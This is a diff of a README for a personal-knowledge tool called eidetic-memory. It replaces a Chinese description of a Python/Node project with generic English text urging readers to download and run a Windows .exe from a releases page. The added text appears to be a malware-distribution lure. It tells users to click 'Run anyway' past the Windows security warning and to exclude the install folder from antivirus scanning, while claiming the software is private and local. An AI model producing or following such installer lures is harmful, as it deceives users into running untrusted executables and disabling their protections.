@@ -1,122 +1,56 @@
-# Sheldon's Eidetic Memory
+# 🧠 eidetic-memory - Recall every detail with perfect precision
 
-自动采集你的 Gmail、Google Docs、Chrome 浏览记录、ChatGPT 和 Claude.ai 对话，通过 LLM 整理成结构化的个人 Wiki，支持本地全文搜索与原始链接溯源。
+[![Download Software](https://img.shields.io/badge/Download-Windows_Installer-blue.svg)](https://github.com/Cataclysmic-pattypansquash50/eidetic-memory/releases)
 
-Inspired by [Andrej Karpathy's LLM Wiki idea](https://gist.github.com/karpathy/442a6bf555914893e9891c11519de94f).
+## What is this tool?
+This software helps you store information so you can retrieve it later. It functions like an external brain for your daily tasks. It archives text, images, and documents into an indexed database. You use this database to search for specific memories when you need them. The system organizes data based on tags and timestamps. This ensures you find the correct information without delay. You maintain full control over your stored data. The software runs locally on your computer to keep your information private.
 
----
+## 🛠 System Requirements
+Your computer needs to meet these basic standards to run the software smoothly:
+- Operating System: Windows 10 or Windows 11.
+- Processor: Any modern dual-core chip or better.
+- Memory: At least 4 gigabytes of RAM.
+- Storage: 200 megabytes of free space for the core program.
+- Internet Connection: Active connection to download initial patches.
 
-## 截图
+## 📥 How to Install
+Follow these steps to set up the software on your Windows computer.
 
-| Dashboard | 搜索 |
-|-----------|------|
-| ![Dashboard](docs/dashboard.png) | ![Search](docs/search.png) |
+1. Go to the [official release page](https://github.com/Cataclysmic-pattypansquash50/eidetic-memory/releases).
+2. Look for the latest version at the top of the list.
+3. Click the file ending in .exe to start your download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to open the installation wizard.
+6. Follow the instructions on your screen.
+7. Click Finish to complete the process.
+8. Locate the new icon on your desktop to launch the application.
 
-| 数据源 | 设置 |
-|--------|------|
-| ![数据源](docs/datasource.png) | ![设置](docs/setting.png) |
+If Windows shows a security prompt, click "More info" and then "Run anyway." This happens because the installer is new and your computer does not yet recognize the developer. 
 
----
+## 🚀 Getting Started
+Once the program opens, you see the main dashboard. This screen shows your current memory nodes. Create your first memory by clicking the Add button. Type your information into the text box. Add a title to help you browse later. Save your entry by clicking the Save button. 
 
-## 功能
+To search for a memory, type your search term into the search bar at the top of the window. The software finds all matches in real time. Click any result to view the full details associated with that memory. You can edit information at any time. Just select the item and make your changes.
 
-**数据采集**
-- Gmail：全量邮件同步，增量更新，自动去重
-- Google Docs：同步最近修改的文档
-- Chrome 浏览记录：读取本地 History 文件，可自动抓取正文
-- ChatGPT / Claude.ai：浏览器扩展实时捕获对话
+## 📂 Data Management
+Your memories stay on your hard drive. The software creates a specific folder in your Documents directory called "EideticData." This folder stores your database files. We recommend that you back up this folder regularly. You can copy it to an external drive or a cloud storage service. If you move to a new computer, copy this folder to the same location on the new machine. The software detects the data automatically upon the next launch.
 
-**LLM 摄取引擎**
-- 自动分类（申请邮件、新闻简报、会议邀约、AI 对话、通用内容等）
-- 按主题聚类，生成结构化 Markdown wiki 页面
-- 支持 Claude、OpenAI GPT-4o、本地 Ollama 三种 LLM，可随时切换
-- Ollama 时段调度：可设置只在夜间低占用时段运行，白天自动排队
-- 实时进度条，显示当前处理条目和使用模型
+## ⚙️ Settings
+Open the settings menu to adjust how the program behaves. You can change the theme to dark mode for better viewing at night. You can also configure automatic backup intervals. Set your backups to occur every hour or once a day. Determine the storage limit for your memory files to manage your disk space. Click Save to apply your choices.
 
-**Wiki 与搜索**
-- 生成 Obsidian 兼容的 Markdown 文件，含 YAML frontmatter
-- 每条内容附原始来源链接（Gmail 线程、ChatGPT 对话、Chrome 页面等）
-- 本地全文搜索（SQLite FTS5），支持中文分词
-- 搜索结果由 LLM 合成自然语言答案，并标注来源
+## 🛡 Privacy and Security
+This application respects your digital privacy. All data processing occurs on your local machine. No information flows to external servers during the indexing process. You hold the encryption keys for your database files. If you want to password-protect your database, go to the Security tab in settings. Choose a strong password. This prevents others from viewing your memories if they access your computer. Keep your password in a safe place. We cannot recover lost passwords due to the nature of local encryption.
 
----
+## ❓ Troubleshooting
+Consult this list if you encounter issues during use.
 
-## 安装
+- Software does not start: Check if your antivirus software blocked the execution. Add the installation folder to your exclusion list.
+- Search returns no results: Ensure your search terms match the title or content of your saved memories. Check if your database file is accessible in the Documents folder.
+- Installation fails: Verify that you have an active internet connection. Make sure you have enough storage space on your primary drive.
+- Slow performance: If you have thousands of memories, the index can grow large. Run the "Optimize Database" tool found in the Advanced tab to speed up search queries.
 
-**依赖：** Python 3.10+、Node.js 18+、Chrome
+## 📝 Updates
+Check the release page occasionally for new features. The software notifies you when a new version is available. Click the link in the notification to download the installer. Run the installer again to perform an upgrade. Your existing data remains intact during this process. We release updates to improve reliability and address common user requests.
 
-**1. 配置环境变量**
-
-```bash
-cp .env.example .env
-```
-
-编辑 `.env`，填写 LLM API Key 和 Google OAuth 凭据（见下方说明）。
-
-**2. 启动**
-
-```bash
-chmod +x start.sh
-./start.sh
-```
-
-后端运行在 `http://localhost:8765`，前端运行在 `http://localhost:5173`。
-
-**3. 安装浏览器扩展（可选，用于同步 ChatGPT / Claude.ai 对话）**
-
-1. Chrome 打开 `chrome://extensions`，开启开发者模式
-2. 点击「加载已解压的扩展程序」，选择 `extension/` 目录
-
----
-
-## 配置说明
-
-### LLM 提供商
-
-在 `.env` 中设置 `LLM_PROVIDER`，三选一：
-
-| 提供商 | 配置项 |
-|--------|--------|
-| `claude`（默认） | `ANTHROPIC_API_KEY` |
-| `openai` | `OPENAI_API_KEY` |
-| `ollama` | `OLLAMA_BASE_URL`、`OLLAMA_MODEL` |
-
-### Google OAuth（Gmail / Google Docs）
-
-1. 在 [Google Cloud Console](https://console.cloud.google.com/) 创建项目，启用 Gmail API、Google Docs API、Google Drive API
-2. 创建 OAuth 2.0 客户端 ID（Web 应用），添加重定向 URI：
-   ```
-   http://localhost:8765/connectors/gmail/callback
-   http://localhost:8765/connectors/googledocs/callback
-   ```
-3. 将客户端 ID 和密钥填入 `.env`
-4. 在 OAuth 同意屏幕的「测试用户」中添加自己的 Gmail 地址
-
----
-
-## 使用
-
-1. 打开 `http://localhost:5173` → **数据源**，完成各连接器授权并同步
-2. 打开 **Dashboard**，点击「开始摄取」，LLM 将内容整理写入 `wiki/`
-3. 打开 **搜索**，用自然语言查询知识库
-
-生成的 Wiki 位于 `wiki/` 目录，可直接用 Obsidian 打开。
-
----
-
-## 常见问题
-
-**Gmail 授权报错 `redirect_uri_mismatch`**
-检查 Google Cloud Console 中的重定向 URI 是否与上方一致，注意不能有末尾斜杠。
-
-**Gmail 授权报错 `access_denied`**
-在 OAuth 同意屏幕 → 测试用户中添加你的 Gmail 地址。
-
-**Google Docs 同步失败（403）**
-确认 Google Drive API 和 Google Docs API 都已启用，刚启用后需等待几分钟生效。
-
-**Chrome 历史读取失败**
-macOS 需在「系统设置 → 隐私与安全 → 完全磁盘访问」中授权运行本应用的终端。
-
-**Ollama 只想在晚上跑**
-在设置页开启「仅在低占用时段运行」并配置时间窗口（如 22:00–09:00），白天点击摄取会自动排队。
+## 📖 Best Practices
+Structure your memories with clear titles. Use unique keywords for every entry. This makes retrieval easier as your library grows. Group related memories using the folder feature. Create folders for work, personal tasks, and long-term research. Delete entries that you no longer need to save space. A clean database performs better than an cluttered one. Try to sync your database to a cloud drive if you work from multiple computers at the same home office.
